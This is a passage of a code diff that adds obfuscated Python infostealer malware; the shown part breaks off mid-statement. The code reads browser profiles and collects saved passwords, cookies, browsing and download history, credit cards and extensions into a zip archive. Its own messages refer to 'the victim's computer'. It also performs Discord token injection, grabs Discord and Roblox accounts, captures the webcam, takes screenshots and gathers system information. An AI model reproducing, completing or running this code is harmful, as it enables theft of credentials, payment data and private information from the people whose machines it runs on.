+        UQSBKEOIZXDPCWGWVGXOQNLNUJHHOYKIZBUFCRRSSVPIRFJGARTXBLSNNYYG = HFAHWFCIJSOAHBMBBGVHTJQRSGGBYRTNNQFFBISJSBZICADOQGDQRCMSHUQAJSAWVBCIIKIBDQOYUWQVJL(os.path.join(NYGTRUQGLCSZQQEUVTIYVDHHNZASKFBEIUPIVVDLMWUXKLXMTNKTAIDOLATIASFNERQAVNBCMIXCHMDXEOOJO, 'Local State'))
+        if not UQSBKEOIZXDPCWGWVGXOQNLNUJHHOYKIZBUFCRRSSVPIRFJGARTXBLSNNYYG:
+            continue
+
+        for v4r_profile in UYUIXVOIRFJKESGRTTXJBDQXUBMMKAPHQRMWXZWSAORHNLHBCWBUJQHXDKCDYKTWGQHVLHMGPE:
+            JQKYYGOAZCZQHPGFQUWOFBKAJXRURWIZMLYLQIJRZQVVZQFMVSLHBHXBQBLQFDJRJKDJKTXHKAEENOVGUQHISB = os.path.join(NYGTRUQGLCSZQQEUVTIYVDHHNZASKFBEIUPIVVDLMWUXKLXMTNKTAIDOLATIASFNERQAVNBCMIXCHMDXEOOJO, v4r_profile)
+            if not os.path.exists(JQKYYGOAZCZQHPGFQUWOFBKAJXRURWIZMLYLQIJRZQVVZQFMVSLHBHXBQBLQFDJRJKDJKTXHKAEENOVGUQHISB):
+                continue
+
+        for v4r_profile in UYUIXVOIRFJKESGRTTXJBDQXUBMMKAPHQRMWXZWSAORHNLHBCWBUJQHXDKCDYKTWGQHVLHMGPE:
+            JQKYYGOAZCZQHPGFQUWOFBKAJXRURWIZMLYLQIJRZQVVZQFMVSLHBHXBQBLQFDJRJKDJKTXHKAEENOVGUQHISB = os.path.join(NYGTRUQGLCSZQQEUVTIYVDHHNZASKFBEIUPIVVDLMWUXKLXMTNKTAIDOLATIASFNERQAVNBCMIXCHMDXEOOJO, v4r_profile)
+            if not os.path.exists(JQKYYGOAZCZQHPGFQUWOFBKAJXRURWIZMLYLQIJRZQVVZQFMVSLHBHXBQBLQFDJRJKDJKTXHKAEENOVGUQHISB):
+                continue
+            
+            if "extentions" in NAFKPTCSPEJUVGDKTMMNLYVBUBSJYNZDYHMCYJDZCFGDFKZKUQDMEHEXPRWQBOSZHMOOPPHYEJGH:
+                try: BFKGVKLKSENQXOFNLWXYHTAXSNACXQXFUARYKECITWTHRQSWCEFSLSEXKO(EZNXYMNHRVXHDZLCDYVWZSMWNIKGPRSFKUWXNCVNAQZODPYZOLOLNWFKLTEWHGWPLHOWOOXAYHJAZNKSCAUNJRXJOGKOWFJIZN, VYYJMOGJMHWVWTUVYAVVRHDMKQNFMTDRLOMMNBYSSVHOQULRZOXXJLRDYBIFIFCHTIAHPHIFEXWKIJWKZKYFAUQ, QIHUHYEPWVKHDAFFBWFNFCGVYGESPSEHYBXVONKVONZWFBICEGDTFLKJCHVXEYAIGPWTVSVJMXASF, JQKYYGOAZCZQHPGFQUWOFBKAJXRURWIZMLYLQIJRZQVVZQFMVSLHBHXBQBLQFDJRJKDJKTXHKAEENOVGUQHISB)
+                except: pass
+                
+            if "passwords" in NAFKPTCSPEJUVGDKTMMNLYVBUBSJYNZDYHMCYJDZCFGDFKZKUQDMEHEXPRWQBOSZHMOOPPHYEJGH:
+                try: ADMGOSXLWGGRTGAAJSNBHUTJEGRRXSADPSJRSPFQMXVZQWDHCFVZULZDUYIQDLBD(QIHUHYEPWVKHDAFFBWFNFCGVYGESPSEHYBXVONKVONZWFBICEGDTFLKJCHVXEYAIGPWTVSVJMXASF, JQKYYGOAZCZQHPGFQUWOFBKAJXRURWIZMLYLQIJRZQVVZQFMVSLHBHXBQBLQFDJRJKDJKTXHKAEENOVGUQHISB, UQSBKEOIZXDPCWGWVGXOQNLNUJHHOYKIZBUFCRRSSVPIRFJGARTXBLSNNYYG)
+                except: pass
+            if "cookies" in NAFKPTCSPEJUVGDKTMMNLYVBUBSJYNZDYHMCYJDZCFGDFKZKUQDMEHEXPRWQBOSZHMOOPPHYEJGH:
+                try: CRABFKBPZBDEJFXZNDWMVVKYFKBBQCBGBSYVQMOVFZQCCBKSZCZ(QIHUHYEPWVKHDAFFBWFNFCGVYGESPSEHYBXVONKVONZWFBICEGDTFLKJCHVXEYAIGPWTVSVJMXASF, JQKYYGOAZCZQHPGFQUWOFBKAJXRURWIZMLYLQIJRZQVVZQFMVSLHBHXBQBLQFDJRJKDJKTXHKAEENOVGUQHISB, UQSBKEOIZXDPCWGWVGXOQNLNUJHHOYKIZBUFCRRSSVPIRFJGARTXBLSNNYYG)
+                except: pass
+            if "history" in NAFKPTCSPEJUVGDKTMMNLYVBUBSJYNZDYHMCYJDZCFGDFKZKUQDMEHEXPRWQBOSZHMOOPPHYEJGH:
+                try: FMLXGNZOGXYXWUCWXMDZGCZUTBYKAWLWHLSSXBHKEDGFOSGRJPTWHVLMVYZCLUIRDODPJYUKNKJDSVLMZLRNXIBZOVKKLB(QIHUHYEPWVKHDAFFBWFNFCGVYGESPSEHYBXVONKVONZWFBICEGDTFLKJCHVXEYAIGPWTVSVJMXASF, JQKYYGOAZCZQHPGFQUWOFBKAJXRURWIZMLYLQIJRZQVVZQFMVSLHBHXBQBLQFDJRJKDJKTXHKAEENOVGUQHISB)
+                except: pass
+            if "downloads" in NAFKPTCSPEJUVGDKTMMNLYVBUBSJYNZDYHMCYJDZCFGDFKZKUQDMEHEXPRWQBOSZHMOOPPHYEJGH:
+                try: VMQZJMXSELOXJWBBQKMRJRZWPRCEKKNQSDKIBTYFGFJGXOAPEBHIKUUHDNUOSMVJBPTMUUYKQBQXUAHD(QIHUHYEPWVKHDAFFBWFNFCGVYGESPSEHYBXVONKVONZWFBICEGDTFLKJCHVXEYAIGPWTVSVJMXASF, JQKYYGOAZCZQHPGFQUWOFBKAJXRURWIZMLYLQIJRZQVVZQFMVSLHBHXBQBLQFDJRJKDJKTXHKAEENOVGUQHISB)
+                except: pass
+            if "cards" in NAFKPTCSPEJUVGDKTMMNLYVBUBSJYNZDYHMCYJDZCFGDFKZKUQDMEHEXPRWQBOSZHMOOPPHYEJGH:
+                try: JQLFERMYBWVDGWJLFWEVUXUSHIPLAQOTJDIMDQXIIKKNRYUJKLAJPLNVRECBXVQBCWGRUVV(QIHUHYEPWVKHDAFFBWFNFCGVYGESPSEHYBXVONKVONZWFBICEGDTFLKJCHVXEYAIGPWTVSVJMXASF, JQKYYGOAZCZQHPGFQUWOFBKAJXRURWIZMLYLQIJRZQVVZQFMVSLHBHXBQBLQFDJRJKDJKTXHKAEENOVGUQHISB, UQSBKEOIZXDPCWGWVGXOQNLNUJHHOYKIZBUFCRRSSVPIRFJGARTXBLSNNYYG)
+                except: pass
+
+            if QIHUHYEPWVKHDAFFBWFNFCGVYGESPSEHYBXVONKVONZWFBICEGDTFLKJCHVXEYAIGPWTVSVJMXASF not in OQTIHFROGQIRAOSXSGBYIHOSOWVSPBHUDMPEAYTBKILRQTYLQQJNYDQAHHGUSXEXITMUJLPVTGJERCWBBYHG:
+                OQTIHFROGQIRAOSXSGBYIHOSOWVSPBHUDMPEAYTBKILRQTYLQQJNYDQAHHGUSXEXITMUJLPVTGJERCWBBYHG.append(QIHUHYEPWVKHDAFFBWFNFCGVYGESPSEHYBXVONKVONZWFBICEGDTFLKJCHVXEYAIGPWTVSVJMXASF)
+
+    if "passwords" in NAFKPTCSPEJUVGDKTMMNLYVBUBSJYNZDYHMCYJDZCFGDFKZKUQDMEHEXPRWQBOSZHMOOPPHYEJGH:
+        if not BXMYTLNHTBXDTXSIRZTNNYESIMQNOXATIWMIQRCZDJDLQXHWIM:
+            BXMYTLNHTBXDTXSIRZTNNYESIMQNOXATIWMIQRCZDJDLQXHWIM.append("No passwords was saved on the victim's computer.")
+        BXMYTLNHTBXDTXSIRZTNNYESIMQNOXATIWMIQRCZDJDLQXHWIM = "\n".join(BXMYTLNHTBXDTXSIRZTNNYESIMQNOXATIWMIQRCZDJDLQXHWIM)
+    if "cookies" in NAFKPTCSPEJUVGDKTMMNLYVBUBSJYNZDYHMCYJDZCFGDFKZKUQDMEHEXPRWQBOSZHMOOPPHYEJGH:
+        if not WHMXDUCYFKDSZTNIZCUXOZFZSJAMTETGNOLRLKDKJHIOMDRKSCKFQZAFQVMIQOGU:
+            WHMXDUCYFKDSZTNIZCUXOZFZSJAMTETGNOLRLKDKJHIOMDRKSCKFQZAFQVMIQOGU.append("No cookies was saved on the victim's computer.")
+        WHMXDUCYFKDSZTNIZCUXOZFZSJAMTETGNOLRLKDKJHIOMDRKSCKFQZAFQVMIQOGU   = "\n".join(WHMXDUCYFKDSZTNIZCUXOZFZSJAMTETGNOLRLKDKJHIOMDRKSCKFQZAFQVMIQOGU)
+    if "history" in NAFKPTCSPEJUVGDKTMMNLYVBUBSJYNZDYHMCYJDZCFGDFKZKUQDMEHEXPRWQBOSZHMOOPPHYEJGH:
+        if not FFPGSUUCKVPHHHEDVAGBAGAWXRNLTSALYIQUSANLVFVBOMBFMGQOERVXHDELGBIYAFDJNQV:
+            FFPGSUUCKVPHHHEDVAGBAGAWXRNLTSALYIQUSANLVFVBOMBFMGQOERVXHDELGBIYAFDJNQV.append("No history was saved on the victim's computer.")
+        FFPGSUUCKVPHHHEDVAGBAGAWXRNLTSALYIQUSANLVFVBOMBFMGQOERVXHDELGBIYAFDJNQV   = "\n".join(FFPGSUUCKVPHHHEDVAGBAGAWXRNLTSALYIQUSANLVFVBOMBFMGQOERVXHDELGBIYAFDJNQV)
+    if "downloads" in NAFKPTCSPEJUVGDKTMMNLYVBUBSJYNZDYHMCYJDZCFGDFKZKUQDMEHEXPRWQBOSZHMOOPPHYEJGH:
+        if not VFWUYEPWLCNOHRVSQHUZVMPCVFYVWHCIAOBZLLTOTAEHSZEHJSVNYRKJGWOMMANWXIBGNVORAWPSCNUAKKKOPAHEFDVI:
+            VFWUYEPWLCNOHRVSQHUZVMPCVFYVWHCIAOBZLLTOTAEHSZEHJSVNYRKJGWOMMANWXIBGNVORAWPSCNUAKKKOPAHEFDVI.append("No downloads was saved on the victim's computer.")
+        VFWUYEPWLCNOHRVSQHUZVMPCVFYVWHCIAOBZLLTOTAEHSZEHJSVNYRKJGWOMMANWXIBGNVORAWPSCNUAKKKOPAHEFDVI = "\n".join(VFWUYEPWLCNOHRVSQHUZVMPCVFYVWHCIAOBZLLTOTAEHSZEHJSVNYRKJGWOMMANWXIBGNVORAWPSCNUAKKKOPAHEFDVI)
+    if "cards" in NAFKPTCSPEJUVGDKTMMNLYVBUBSJYNZDYHMCYJDZCFGDFKZKUQDMEHEXPRWQBOSZHMOOPPHYEJGH:
+        if not AVUEJDFEGFQNLXUAJDBWUEGUPAHXJZCPZESDAXMWJPPNSXQYNSUZDMKYQAURFQMTGEJQPPVKKPTGJCMESTLXUIIYNSGSKFY:
+            AVUEJDFEGFQNLXUAJDBWUEGUPAHXJZCPZESDAXMWJPPNSXQYNSUZDMKYQAURFQMTGEJQPPVKKPTGJCMESTLXUIIYNSGSKFY.append("No cards was saved on the victim's computer.")
+        AVUEJDFEGFQNLXUAJDBWUEGUPAHXJZCPZESDAXMWJPPNSXQYNSUZDMKYQAURFQMTGEJQPPVKKPTGJCMESTLXUIIYNSGSKFY     = "\n".join(AVUEJDFEGFQNLXUAJDBWUEGUPAHXJZCPZESDAXMWJPPNSXQYNSUZDMKYQAURFQMTGEJQPPVKKPTGJCMESTLXUIIYNSGSKFY)
+    
+    if VZZQKYMSSQZLYPNMFMZLYHUEBMIABELEPLAWUUSZMVAUFTTBPIPWPJWZYEVNYNFZENGMCSVMAQMKCQAUCGZCJ != None:
+        EZNXYMNHRVXHDZLCDYVWZSMWNIKGPRSFKUWXNCVNAQZODPYZOLOLNWFKLTEWHGWPLHOWOOXAYHJAZNKSCAUNJRXJOGKOWFJIZN.writestr(f"Passwords ({VZZQKYMSSQZLYPNMFMZLYHUEBMIABELEPLAWUUSZMVAUFTTBPIPWPJWZYEVNYNFZENGMCSVMAQMKCQAUCGZCJ}).txt", BXMYTLNHTBXDTXSIRZTNNYESIMQNOXATIWMIQRCZDJDLQXHWIM)
+
+    if MRADXHRKQXSFRCZTZCXFUDEUSBPLQUBLUQDBSXHIRJVURICKWFHCVDDMEUKVIVPMXTNLXDJWITDHSMHENIMVKRCU != None:
+        EZNXYMNHRVXHDZLCDYVWZSMWNIKGPRSFKUWXNCVNAQZODPYZOLOLNWFKLTEWHGWPLHOWOOXAYHJAZNKSCAUNJRXJOGKOWFJIZN.writestr(f"Cookies ({MRADXHRKQXSFRCZTZCXFUDEUSBPLQUBLUQDBSXHIRJVURICKWFHCVDDMEUKVIVPMXTNLXDJWITDHSMHENIMVKRCU}).txt", WHMXDUCYFKDSZTNIZCUXOZFZSJAMTETGNOLRLKDKJHIOMDRKSCKFQZAFQVMIQOGU)
+
+    if QBSCIMDFNYTOBGHGLZKGMYRBEPIWOWTMEXEWHNDYHLHIDUQPLJGAVNBAOVJVGXNNMQUOFJQSPSU != None:
+        EZNXYMNHRVXHDZLCDYVWZSMWNIKGPRSFKUWXNCVNAQZODPYZOLOLNWFKLTEWHGWPLHOWOOXAYHJAZNKSCAUNJRXJOGKOWFJIZN.writestr(f"Cards ({QBSCIMDFNYTOBGHGLZKGMYRBEPIWOWTMEXEWHNDYHLHIDUQPLJGAVNBAOVJVGXNNMQUOFJQSPSU}).txt", AVUEJDFEGFQNLXUAJDBWUEGUPAHXJZCPZESDAXMWJPPNSXQYNSUZDMKYQAURFQMTGEJQPPVKKPTGJCMESTLXUIIYNSGSKFY)
+
+    if JZSCRVUXLTDZXBPEKCLZCCPCZFAXPQSWBSSTUTTFXCYKDLVMENUYECSETHEACLURUVHSXYW != None:
+        EZNXYMNHRVXHDZLCDYVWZSMWNIKGPRSFKUWXNCVNAQZODPYZOLOLNWFKLTEWHGWPLHOWOOXAYHJAZNKSCAUNJRXJOGKOWFJIZN.writestr(f"Browsing History ({JZSCRVUXLTDZXBPEKCLZCCPCZFAXPQSWBSSTUTTFXCYKDLVMENUYECSETHEACLURUVHSXYW}).txt", FFPGSUUCKVPHHHEDVAGBAGAWXRNLTSALYIQUSANLVFVBOMBFMGQOERVXHDELGBIYAFDJNQV)
+
+    if GQWIOGYFCMWVUQXESOADAFERNBWXBCZPCZSCINUDPHLWHZUUSBAHCIKIXIBFGJMRMXAYXEEWUORYDASRJHASFC != None:
+        EZNXYMNHRVXHDZLCDYVWZSMWNIKGPRSFKUWXNCVNAQZODPYZOLOLNWFKLTEWHGWPLHOWOOXAYHJAZNKSCAUNJRXJOGKOWFJIZN.writestr(f"Download History ({GQWIOGYFCMWVUQXESOADAFERNBWXBCZPCZSCINUDPHLWHZUUSBAHCIKIXIBFGJMRMXAYXEEWUORYDASRJHASFC}).txt",VFWUYEPWLCNOHRVSQHUZVMPCVFYVWHCIAOBZLLTOTAEHSZEHJSVNYRKJGWOMMANWXIBGNVORAWPSCNUAKKKOPAHEFDVI)
+
+    return VDLDIMTVBTGLZHNXMVQUSJWSVUIEWEBEPQDSLHIMMUCYPTSTIVIQQKXPMXHYXMEEHLPQKYKZGODUINNHZGGRPPOSHPZZ, VZZQKYMSSQZLYPNMFMZLYHUEBMIABELEPLAWUUSZMVAUFTTBPIPWPJWZYEVNYNFZENGMCSVMAQMKCQAUCGZCJ, MRADXHRKQXSFRCZTZCXFUDEUSBPLQUBLUQDBSXHIRJVURICKWFHCVDDMEUKVIVPMXTNLXDJWITDHSMHENIMVKRCU, JZSCRVUXLTDZXBPEKCLZCCPCZFAXPQSWBSSTUTTFXCYKDLVMENUYECSETHEACLURUVHSXYW, GQWIOGYFCMWVUQXESOADAFERNBWXBCZPCZSCINUDPHLWHZUUSBAHCIKIXIBFGJMRMXAYXEEWUORYDASRJHASFC, QBSCIMDFNYTOBGHGLZKGMYRBEPIWOWTMEXEWHNDYHLHIDUQPLJGAVNBAOVJVGXNNMQUOFJQSPSU
+
+QOLMEIIXFKTJULGDKCXBQSAEIMLKAESRGJZKPAQZPXKKYQUWHOMANZBBTXUVFIBAJWZJIBIWMGWDGPRSLKZRYEBNNYHC = []
+
+BLPJIJBWDUMWGFYXECRXCNUXDYKTLDVTATSFJRMMDMJRMKQANDVUEQQH = io.BytesIO()
+with zipfile.ZipFile(BLPJIJBWDUMWGFYXECRXCNUXDYKTLDVTATSFJRMMDMJRMKQANDVUEQQH, "w", zipfile.ZIP_DEFLATED) as EZNXYMNHRVXHDZLCDYVWZSMWNIKGPRSFKUWXNCVNAQZODPYZOLOLNWFKLTEWHGWPLHOWOOXAYHJAZNKSCAUNJRXJOGKOWFJIZN:
+
+    try: 
+        AWRMEDOMSIQEROJINBSLEQZPAFJYACFEDGUMGQSDXZJBJVXCDSRCIKMDFCIH = FUCHLXDYTWSDLVFINVEWJJZMBEIZJJCTUJTGWRVFGAGNLAAWAKOLJTAVGUWBMDR()
+    except Exception as e:
+        AWRMEDOMSIQEROJINBSLEQZPAFJYACFEDGUMGQSDXZJBJVXCDSRCIKMDFCIH = f"Error: {e}"
+
+    try: 
+        SURBDEEKJOWQUKTNKTQRPQOYLQZOPHXZZFXUDXDETPCZOVQBSWRCZF_system_info = JNXAOHWIFLMCSGCKAOVBYZEDIPMNLJYJTULLSFXYAYWWXGMJNLDTKNCBES(EZNXYMNHRVXHDZLCDYVWZSMWNIKGPRSFKUWXNCVNAQZODPYZOLOLNWFKLTEWHGWPLHOWOOXAYHJAZNKSCAUNJRXJOGKOWFJIZN)
+    except Exception as e:
+        SURBDEEKJOWQUKTNKTQRPQOYLQZOPHXZZFXUDXDETPCZOVQBSWRCZF_system_info = f"Error: {e}"
+
+    try: 
+        FXMNLKHBPLEIJXCQXOISUKTMJWQZSUARYCATCCMVDQSURPLDSMSBCOKHIMDUFTRDKVVPXKPPDITAOOZWUNTXFJWXVGFYCQKD = RURHFGHCHKIDGXCVPEABJHMJDSILHSQKSGZNLQZRTDGPSECVJCAKVRMFYHYUQKUZDNALVLQQJZZRLZ(EZNXYMNHRVXHDZLCDYVWZSMWNIKGPRSFKUWXNCVNAQZODPYZOLOLNWFKLTEWHGWPLHOWOOXAYHJAZNKSCAUNJRXJOGKOWFJIZN)
+    except Exception as e:
+        FXMNLKHBPLEIJXCQXOISUKTMJWQZSUARYCATCCMVDQSURPLDSMSBCOKHIMDUFTRDKVVPXKPPDITAOOZWUNTXFJWXVGFYCQKD = f"Error: {e}"
+
+    try: 
+        VDLDIMTVBTGLZHNXMVQUSJWSVUIEWEBEPQDSLHIMMUCYPTSTIVIQQKXPMXHYXMEEHLPQKYKZGODUINNHZGGRPPOSHPZZ, VZZQKYMSSQZLYPNMFMZLYHUEBMIABELEPLAWUUSZMVAUFTTBPIPWPJWZYEVNYNFZENGMCSVMAQMKCQAUCGZCJ, MRADXHRKQXSFRCZTZCXFUDEUSBPLQUBLUQDBSXHIRJVURICKWFHCVDDMEUKVIVPMXTNLXDJWITDHSMHENIMVKRCU, JZSCRVUXLTDZXBPEKCLZCCPCZFAXPQSWBSSTUTTFXCYKDLVMENUYECSETHEACLURUVHSXYW, GQWIOGYFCMWVUQXESOADAFERNBWXBCZPCZSCINUDPHLWHZUUSBAHCIKIXIBFGJMRMXAYXEEWUORYDASRJHASFC, QBSCIMDFNYTOBGHGLZKGMYRBEPIWOWTMEXEWHNDYHLHIDUQPLJGAVNBAOVJVGXNNMQUOFJQSPSU = FXZQPCMPDJKPWZPVXSQNPJTPTBBWFVRSGSSQFBSUIIQKIQWTNHVR(EZNXYMNHRVXHDZLCDYVWZSMWNIKGPRSFKUWXNCVNAQZODPYZOLOLNWFKLTEWHGWPLHOWOOXAYHJAZNKSCAUNJRXJOGKOWFJIZN)
+    except Exception as e:
+        VDLDIMTVBTGLZHNXMVQUSJWSVUIEWEBEPQDSLHIMMUCYPTSTIVIQQKXPMXHYXMEEHLPQKYKZGODUINNHZGGRPPOSHPZZ = f"Error: {e}"
+        VZZQKYMSSQZLYPNMFMZLYHUEBMIABELEPLAWUUSZMVAUFTTBPIPWPJWZYEVNYNFZENGMCSVMAQMKCQAUCGZCJ = f"Error: {e}"
+        MRADXHRKQXSFRCZTZCXFUDEUSBPLQUBLUQDBSXHIRJVURICKWFHCVDDMEUKVIVPMXTNLXDJWITDHSMHENIMVKRCU = f"Error: {e}"
+        JZSCRVUXLTDZXBPEKCLZCCPCZFAXPQSWBSSTUTTFXCYKDLVMENUYECSETHEACLURUVHSXYW = f"Error: {e}"
+        GQWIOGYFCMWVUQXESOADAFERNBWXBCZPCZSCINUDPHLWHZUUSBAHCIKIXIBFGJMRMXAYXEEWUORYDASRJHASFC = f"Error: {e}"
+        QBSCIMDFNYTOBGHGLZKGMYRBEPIWOWTMEXEWHNDYHLHIDUQPLJGAVNBAOVJVGXNNMQUOFJQSPSU = f"Error: {e}"
+
+    try: 
+        FWCSHLFLHCFHKKMKJWMVIEUYHCPHBYMJKEWQWMNTILEGRUOEIIQ = ILBRPVNKVBVFEWLJAYQWDSBAJGPJUTJWJZHKEUTBEECEBNCUVKDJZNDBCAGKOWWQHTPRPFAQWDEDVXBA(EZNXYMNHRVXHDZLCDYVWZSMWNIKGPRSFKUWXNCVNAQZODPYZOLOLNWFKLTEWHGWPLHOWOOXAYHJAZNKSCAUNJRXJOGKOWFJIZN)
+    except Exception as e:
+        FWCSHLFLHCFHKKMKJWMVIEUYHCPHBYMJKEWQWMNTILEGRUOEIIQ = f"Error: {e}"
+
+    try: 
+        SURBDEEKJOWQUKTNKTQRPQOYLQZOPHXZZFXUDXDETPCZOVQBSWRCZF_camera_capture = TFYOYIQBRZYQDITODESBPVCNLYMOETCEKDMYPOAGBMSKFSWNIMAOVWOEG(EZNXYMNHRVXHDZLCDYVWZSMWNIKGPRSFKUWXNCVNAQZODPYZOLOLNWFKLTEWHGWPLHOWOOXAYHJAZNKSCAUNJRXJOGKOWFJIZN)
+    except Exception as e:
+        SURBDEEKJOWQUKTNKTQRPQOYLQZOPHXZZFXUDXDETPCZOVQBSWRCZF_camera_capture = f"Error: {e}"
+
+    try: 
+        SURBDEEKJOWQUKTNKTQRPQOYLQZOPHXZZFXUDXDETPCZOVQBSWRCZF_screenshot = ZJDPUHCXAXJRLRCGFMMLMGORGYNXDIWAPXILIJJTZERZTPIHDCKILVYNWBALBAQBQZXHHWFOFJLFVLZNNUKUFOGDYQSRZDCWFMR(EZNXYMNHRVXHDZLCDYVWZSMWNIKGPRSFKUWXNCVNAQZODPYZOLOLNWFKLTEWHGWPLHOWOOXAYHJAZNKSCAUNJRXJOGKOWFJIZN)
+    except Exception as e:
+        SURBDEEKJOWQUKTNKTQRPQOYLQZOPHXZZFXUDXDETPCZOVQBSWRCZF_screenshot = f"Error: {e}"
+
+    try: 
+        JLWFIATIJZSTEJZIRLXDKSBLOIQFYKDZWCSKYPCHDQAGASNHAHQGKLKBXEHPUUGXHBHKKJFKFLZCULWDQBXANL, ZBMVWPSWXZNGFFJLNSGQCYJLSRDDWOOTSKGWTKVNXKGZLLOGDZSCMXXGDQX, DPMQZTMSZKIRWPPSNJPXQVJPKNPHEQHPCOQGBLUEAGANVRRUDLSOBCVCXMQUVUPOKS = TKLENYLHBOFEJLYTGBKVZYYDAOQWHMKYSZGAVNENTWEEBKJYVKLNNADJZCH(EZNXYMNHRVXHDZLCDYVWZSMWNIKGPRSFKUWXNCVNAQZODPYZOLOLNWFKLTEWHGWPLHOWOOXAYHJAZNKSCAUNJRXJOGKOWFJIZN)
+    except Exception as e:
+        SURBDEEKJOWQUKTNKTQRPQOYLQZOPHXZZFXUDXDETPCZOVQBSWRCZF_screenshot = f"Error: {e}"
+
+    try: 
+        XWVIZQTTQWCVLEQUILKVIWSQPQHTYJIBXNMIGCBDXXWLHTJHQWMVMNOGDFZ = AEQFDKGIPKPGWLGOAOVWNKYBXBBXWPKPWSCJKPGFFYELBQTVJYHNIENNJHELLQNJBCLLWQRCAKNIGMEBVJMLJOKTMQY(EZNXYMNHRVXHDZLCDYVWZSMWNIKGPRSFKUWXNCVNAQZODPYZOLOLNWFKLTEWHGWPLHOWOOXAYHJAZNKSCAUNJRXJOGKOWFJIZN)
+    except Exception as e:
+        XWVIZQTTQWCVLEQUILKVIWSQPQHTYJIBXNMIGCBDXXWLHTJHQWMVMNOGDFZ = f"Error: {e}"
+
+    if AWRMEDOMSIQEROJINBSLEQZPAFJYACFEDGUMGQSDXZJBJVXCDSRCIKMDFCIH != None:
+        QOLMEIIXFKTJULGDKCXBQSAEIMLKAESRGJZKPAQZPXKKYQUWHOMANZBBTXUVFIBAJWZJIBIWMGWDGPRSLKZRYEBNNYHC.append(f"Discord Injection : {AWRMEDOMSIQEROJINBSLEQZPAFJYACFEDGUMGQSDXZJBJVXCDSRCIKMDFCIH}")
+
+    if SURBDEEKJOWQUKTNKTQRPQOYLQZOPHXZZFXUDXDETPCZOVQBSWRCZF_camera_capture != None:
+        QOLMEIIXFKTJULGDKCXBQSAEIMLKAESRGJZKPAQZPXKKYQUWHOMANZBBTXUVFIBAJWZJIBIWMGWDGPRSLKZRYEBNNYHC.append(f"Camera Capture    : {SURBDEEKJOWQUKTNKTQRPQOYLQZOPHXZZFXUDXDETPCZOVQBSWRCZF_camera_capture}")
+
+    if SURBDEEKJOWQUKTNKTQRPQOYLQZOPHXZZFXUDXDETPCZOVQBSWRCZF_screenshot != None:
+        QOLMEIIXFKTJULGDKCXBQSAEIMLKAESRGJZKPAQZPXKKYQUWHOMANZBBTXUVFIBAJWZJIBIWMGWDGPRSLKZRYEBNNYHC.append(f"Screenshot        : {SURBDEEKJOWQUKTNKTQRPQOYLQZOPHXZZFXUDXDETPCZOVQBSWRCZF_screenshot}")
+
+    if SURBDEEKJOWQUKTNKTQRPQOYLQZOPHXZZFXUDXDETPCZOVQBSWRCZF_system_info != None:
+        QOLMEIIXFKTJULGDKCXBQSAEIMLKAESRGJZKPAQZPXKKYQUWHOMANZBBTXUVFIBAJWZJIBIWMGWDGPRSLKZRYEBNNYHC.append(f"System Info       : {SURBDEEKJOWQUKTNKTQRPQOYLQZOPHXZZFXUDXDETPCZOVQBSWRCZF_system_info}")
+
+    if FXMNLKHBPLEIJXCQXOISUKTMJWQZSUARYCATCCMVDQSURPLDSMSBCOKHIMDUFTRDKVVPXKPPDITAOOZWUNTXFJWXVGFYCQKD != None:
+        QOLMEIIXFKTJULGDKCXBQSAEIMLKAESRGJZKPAQZPXKKYQUWHOMANZBBTXUVFIBAJWZJIBIWMGWDGPRSLKZRYEBNNYHC.append(f"Discord Accounts  : {FXMNLKHBPLEIJXCQXOISUKTMJWQZSUARYCATCCMVDQSURPLDSMSBCOKHIMDUFTRDKVVPXKPPDITAOOZWUNTXFJWXVGFYCQKD}")
+
+    if FWCSHLFLHCFHKKMKJWMVIEUYHCPHBYMJKEWQWMNTILEGRUOEIIQ != None:
+        QOLMEIIXFKTJULGDKCXBQSAEIMLKAESRGJZKPAQZPXKKYQUWHOMANZBBTXUVFIBAJWZJIBIWMGWDGPRSLKZRYEBNNYHC.append(f"Roblox Accounts   : {FWCSHLFLHCFHKKMKJWMVIEUYHCPHBYMJKEWQWMNTILEGRUOEIIQ}")
+
+    if VZZQKYMSSQZLYPNMFMZLYHUEBMIABELEPLAWUUSZMVAUFTTBPIPWPJWZYEVNYNFZENGMCSVMAQMKCQAUCGZCJ != None:
+        QOLMEIIXFKTJULGDKCXBQSAEIMLKAESRGJZKPAQZPXKKYQUWHOMANZBBTXUVFIBAJWZJIBIWMGWDGPRSLKZRYEBNNYHC.append(f"Passwords         : {VZZQKYMSSQZLYPNMFMZLYHUEBMIABELEPLAWUUSZMVAUFTTBPIPWPJWZYEVNYNFZENGMCSVMAQMKCQAUCGZCJ}")
+
+    if MRADXHRKQXSFRCZTZCXFUDEUSBPLQUBLUQDBSXHIRJVURICKWFHCVDDMEUKVIVPMXTNLXDJWITDHSMHENIMVKRCU != None:
+        QOLMEIIXFKTJULGDKCXBQSAEIMLKAESRGJZKPAQZPXKKYQUWHOMANZBBTXUVFIBAJWZJIBIWMGWDGPRSLKZRYEBNNYHC.append(f"Cookies           : {MRADXHRKQXSFRCZTZCXFUDEUSBPLQUBLUQDBSXHIRJVURICKWFHCVDDMEUKVIVPMXTNLXDJWITDHSMHENIMVKRCU}")
+
+    if QBSCIMDFNYTOBGHGLZKGMYRBEPIWOWTMEXEWHNDYHLHIDUQPLJGAVNBAOVJVGXNNMQUOFJQSPSU != None:
+        QOLMEIIXFKTJULGDKCXBQSAEIMLKAESRGJZKPAQZPXKKYQUWHOMANZBBTXUVFIBAJWZJIBIWMGWDGPRSLKZRYEBNNYHC.append(f"Cards             : {QBSCIMDFNYTOBGHGLZKGMYRBEPIWOWTMEXEWHNDYHLHIDUQPLJGAVNBAOVJVGXNNMQUOFJQSPSU}")
+
+    if JZSCRVUXLTDZXBPEKCLZCCPCZFAXPQSWBSSTUTTFXCYKDLVMENUYECSETHEACLURUVHSXYW != None:
+        QOLMEIIXFKTJULGDKCXBQSAEIMLKAESRGJZKPAQZPXKKYQUWHOMANZBBTXUVFIBAJWZJIBIWMGWDGPRSLKZRYEBNNYHC.append(f"Browsing History  : {JZSCRVUXLTDZXBPEKCLZCCPCZFAXPQSWBSSTUTTFXCYKDLVMENUYECSETHEACLURUVHSXYW}")
+
+    if GQWIOGYFCMWVUQXESOADAFERNBWXBCZPCZSCINUDPHLWHZUUSBAHCIKIXIBFGJMRMXAYXEEWUORYDASRJHASFC != None:
